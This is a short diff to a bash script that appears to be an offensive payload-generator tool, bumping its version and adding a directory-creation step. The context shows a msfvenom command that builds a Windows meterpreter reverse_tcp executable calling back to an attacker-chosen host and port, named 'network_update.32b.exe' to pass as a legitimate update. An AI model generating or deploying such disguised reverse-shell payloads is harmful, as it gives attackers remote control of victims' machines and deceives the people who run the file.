@@ -4,7 +4,7 @@ readonly RED="\e[1;31m"
 readonly GREEN="\e[1;32m"
 readonly YELLOW="\e[1;33m"
 readonly RESET="\e[0m"
-readonly VERSION="v.0.0.1 | Alfa"
+readonly VERSION="v.0.0.3"
 readonly NOTES="Only available for Windows for now..."
 
 echo -e "${RED}"
@@ -44,6 +44,7 @@ elif [ "$1" == "-gp" ]; then
 		echo -e "${GREEN}[+] Payload generated!"
 	elif [ "$OS" == "windows" ] && [ "$architecture" == "x86" ]; then
 		echo -e "[*] Generating $OS $architecture payload...${RESET}"
+		mkdir payloads
 		msfvenom -p windows/meterpreter/reverse_tcp LHOST=$HOST LPORT=$PORT -f exe -o payloads/network_update.32b.exe
 		echo -e "${GREEN}[+] Payload generated!"
 	fi
